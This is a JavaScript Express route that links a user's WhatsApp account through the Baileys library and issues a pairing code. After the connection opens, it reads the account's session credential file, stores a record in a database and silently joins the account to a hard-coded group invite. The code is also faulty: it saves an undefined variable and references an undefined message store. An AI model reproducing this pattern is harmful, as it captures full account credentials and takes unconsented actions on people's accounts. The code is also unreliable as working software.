const { makeid } = require("../lib/makeid");
const express = require("express");
const fs = require("fs");
const router = express.Router();
const Paste = require("../models/session");
const {
  default: makeWASocket,
  Browsers,
  delay,
  useMultiFileAuthState,
  BufferJSON,
  fetchLatestBaileysVersion,
  PHONENUMBER_MCC,
  DisconnectReason,
  makeInMemoryStore,
  jidNormalizedUser,
  makeCacheableSignalKeyStore,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const NodeCache = require("node-cache");

router.get("/pair", async (req, res) => {
  const id = makeid();
  let num = req.query.number;

  async function pair() {
    //------------------------------------------------------
    let { version, isLatest } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState("./session/" + id);
    const msgRetryCounterCache = new NodeCache(); // for retry message, "waiting message"
    const alpha = makeWASocket({
      logger: pino({ level: "silent" }),
      printQRInTerminal: false, // popping up QR in terminal log
      browser: Browsers.windows("Firefox"), // for this issues https://github.com/WhiskeySockets/Baileys/issues/328
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
          state.keys,
          pino({ level: "fatal" }).child({ level: "fatal" }),
        ),
      },
      markOnlineOnConnect: true, // set false for offline
      generateHighQualityLinkPreview: true, // make high preview link
      getMessage: async (key) => {
        let jid = jidNormalizedUser(key.remoteJid);
        let msg = await store.loadMessage(jid, key.id);

        return msg?.message || "";
      },
      msgRetryCounterCache, // Resolve waiting messages
      defaultQueryTimeoutMs: undefined, // for this issues https://github.com/WhiskeySockets/Baileys/issues/276
    });
    if (!alpha.authState.creds.registered) {
      let phoneNumber = num;
      if (!!phoneNumber) {
        phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
      } else {
      }
      setTimeout(async () => {
        let code = await alpha.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        if (!res.headersSent) {
          await res.send({ code });
        }
      }, 3000);
    }
    alpha.ev.on("connection.update", async (s) => {
      const { connection, lastDisconnect } = s;
      if (connection == "open") {
        await delay(1000 * 20);
        const unique = fs.readFileSync(__dirname + `/session/${id}/creds.json`);
        const c = Buffer.from(unique).toString("base64");
        alpha.groupAcceptInvite("BGWpp9qySw81CGrqRM3ceg");
        await alpha.sendMessage(alpha.user.id, {
          text: id,
        });
        const paste = new Paste({
          id: id,
          number: alpha.user.id,
          banned: false,
          content: content,
        });
        await paste.save();
        res.json({ sessionId: id });
        await delay(1000 * 2);
        await delay(1000 * 2);
        process.exit(0);
      }
      if (
        connection === "close" &&
        lastDisconnect &&
        lastDisconnect.error &&
        lastDisconnect.error.output.statusCode != 401
      ) {
        pair();
      }
    });
    alpha.ev.on("creds.update", saveCreds);
    alpha.ev.on("messages.upsert", () => {});
  }
  pair();
});

module.exports = router;
